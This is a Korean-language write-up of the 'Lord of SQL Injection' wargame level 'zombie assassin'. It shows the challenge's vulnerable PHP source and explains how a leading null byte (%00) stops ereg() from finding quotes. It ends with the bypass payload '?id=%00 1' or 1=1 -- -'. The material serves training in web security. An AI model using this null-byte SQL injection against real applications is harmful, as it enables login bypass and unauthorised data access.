# Lord of SQL Injection No.16 - zombie assassin
## 문제 출제 의도
1. ereg()함수의 취약점에 대해 알고 있는지 확인한다.
2. 아스키코드를 이해하고 있는지, query에 삽입할수 있는지 확인한다.
## 소스 코드 분석
+ 소스 코드  
zombie assassin의 소스 코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
    if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(@ereg("'",$_GET[id])) exit("HeHe"); 
    if(@ereg("'",$_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) solve("zombie_assassin"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - ereg()함수
        + ereg()함수는 다음과 같은 형식을 취한다.
        ~~~
        ereg("찾고자 하는 문자", "임의의 값")
        ~~~
        + ereg 함수는 대 소문자를 구분하며 eregi 함수는 대소문자를 구별하지 않는다.
        + ereg 함수는 취약점 때문에PHP 5.3+부터 사용되지 않고 6.0부터 삭제된다.
        + ereg 함수는 %00(NULL)문자를 만나면 탐색을 종료한다.

## 문제 해결
+ SQL injection
    - ereg 함수에서 가장 앞에 %00을 만나면 탐색을 종료하기 때문에 이를 이요하여 해결하면 문제가 해결된다.
    - 따라서 다음과 같은 추가 문자열을 URL 뒤에 추가하면 문제가 해결된다.
    ~~~
    ?id=%00 1' or 1=1 -- -
    ~~~